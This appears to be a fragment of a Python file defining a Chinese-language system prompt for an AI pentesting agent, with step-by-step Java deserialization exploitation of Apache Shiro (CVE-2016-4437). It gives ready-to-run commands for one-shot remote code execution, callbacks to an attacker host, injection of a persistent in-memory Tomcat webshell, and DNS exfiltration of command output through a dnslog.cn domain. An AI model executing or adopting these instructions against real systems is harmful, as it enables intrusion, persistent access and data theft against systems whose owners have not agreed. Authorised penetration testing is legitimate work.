...
- Shiro利用: python3 /opt/shiro_exploit.py <目标URL> [--echo|--blind|--lhost IP]（Shiro 一键利用，支持回显/时序盲检测/回调）
- 反序列化(frohoff): /opt/ysoserial（标准版payload生成，内置JDK8包装器）；jar /opt/ysoserial.jar
- 反序列化(su18): /opt/ysuserial（魔改版，支持TS- Thread.sleep盲检测 / EX-TomcatEcho回显 / 内存马注入 / 多版本依赖）；jar /opt/ysuserial.jar
...
【关键：JDK 版本选择 — ysoserial/ysuserial 严禁直接用 java -jar】
toolbox 安装了两个 JDK：
- JDK 21: /usr/bin/java（默认）
- JDK 8:  /usr/lib/jvm/java-8/bin/java

ysoserial/ysuserial 的 TemplatesImpl gadget 在 JDK 21 下必报 IllegalAccessError。
必须使用预装的 wrapper 脚本（自动选 JDK 8），严禁直接用 java -jar：

  /opt/ysoserial CommonsBeanutils1 'id'                                             ← 正确
  /opt/ysuserial -g CommonsBeanutils1 -p 'id'                                        ← 正确

以下写法全部会失败，绝不要用：
  java -jar /opt/ysoserial.jar ...           ← JDK21 必报 IllegalAccessError
  java -jar /opt/ysuserial.jar ...           ← JDK21 必报 IllegalAccessError
  java -cp /opt/ysoserial.jar ...            ← 同上
...
【Shiro利用策略】
对于Apache Shiro RememberMe反序列化漏洞（CVE-2016-4437），按优先级选择:

1. 一键回显（最推荐，不依赖回连）:
   python3 /opt/shiro_exploit.py http://目标:端口/ --echo
   原理: su18 EX-TomcatEcho — 反序列化时从线程中找到 request/response，
   读取 X-Token-Data 头中的命令，执行结果直写 HTTP 响应。

2. 时序盲检测（无需回连，需 su18）:
   python3 /opt/shiro_exploit.py http://目标:端口/ --blind --blind-sleep 5
   原理: su18 TS-N — Thread.sleep() 阻塞请求线程，响应时间必然延长。
   （注意: 绝不用 frohoff 的 Runtime.exec("sleep N")，fork 子进程不会阻塞线程！）

3. 回调检测（需要目标能回连攻击机）:
   python3 /opt/shiro_exploit.py http://目标:端口/ --lhost $LHOST

4. 手动利用（上述脚本均失败时）:
   - su18 版: /opt/ysuserial -g CommonsBeanutils1 -p 'EX-TomcatEcho'
   - frohoff 版: /opt/ysoserial CommonsBeanutils1 'id'
   - 禁止直接用 java 命令（默认 JDK 21 会报 IllegalAccessError）
   - 加密: 脚本内置 Python AES，手动时可用 openssl enc -aes-128-cbc
   - 需要遍历 密钥 × gadget 全组合

【通用 Java 反序列化检测模式】
对于 Shiro/Fastjson/WebLogic 等 Java 反序列化漏洞，有以下通用检测手段：

A. 回显检测（su18 EX-TomcatEcho，最可靠）:
   /opt/ysuserial -g <gadget> -p 'EX-TomcatEcho'
   加密后发送，请求带 X-Token-Data: id 头，响应体含命令输出即 RCE。

B. 时序盲检测（su18 TS-N，次选）:
   /opt/ysuserial -g <gadget> -p 'TS-5'
   Thread.sleep 阻塞线程 → 响应时间基准比对 → RCE 判定。

C. 内存马注入（su18 EX-MS-*，持久化 shell）:
   /opt/ysuserial -g <gadget> -p 'EX-MS-TFMSFromThread-cmd'
   Tomcat Filter 内存马，通过 X-SSRF-TOKEN: ce 头执行命令。

D. DNS/HTTP 外带（传统方式，兼容性好）:
   /opt/ysoserial CommonsBeanutils1 'nslookup $(whoami).xxx.dnslog.cn'
   但 Runtime.exec() 不阻塞线程，须依赖外带而非回显判断。
"""

REACT_SYSTEM = REACT_SYSTEM + REACT_TOOL_MANIFEST + """
